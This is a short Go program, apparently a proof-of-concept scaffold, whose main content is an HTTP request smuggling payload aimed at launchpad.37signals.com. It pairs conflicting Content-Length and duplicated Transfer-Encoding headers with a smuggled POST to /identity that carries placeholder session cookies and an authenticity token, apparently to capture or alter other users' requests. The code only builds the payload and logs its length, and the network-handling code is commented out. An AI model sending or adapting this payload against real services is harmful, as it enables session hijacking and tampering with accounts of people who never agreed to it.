package main

import (
	util "github.com/hktalent/go-utils"
	"log"
	"strings"
)

func main() {
	util.DoInitAll()

	attack := []string{`POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

`, `3
x=1
0

`, `POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

`, `_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d=`}
	for i, x := range attack {
		attack[i] = strings.ReplaceAll(x, "\n", "\r\n")
		log.Println(i, len(attack[i]))
	}

	//go util.DoRunning()
	//out := util.GetSimpleInput()
	//for x := range out {
	//	if "" != *x {
	//		func(s1 string) {
	//			util.DefaultPool.Submit(func() {
	//				if m1 := util.GetUrlInfo(s1); nil != m1 {
	//					m1.Set("tools", "httpHeader")
	//					m1.Set("tags", "httpHeader,http")
	//					util.PushLog(&m1)
	//				}
	//			})
	//		}(*x)
	//	} else {
	//		break
	//	}
	//}
	util.Wg.Wait()
	util.CloseAll()
	util.CloseLogBigDb()
}
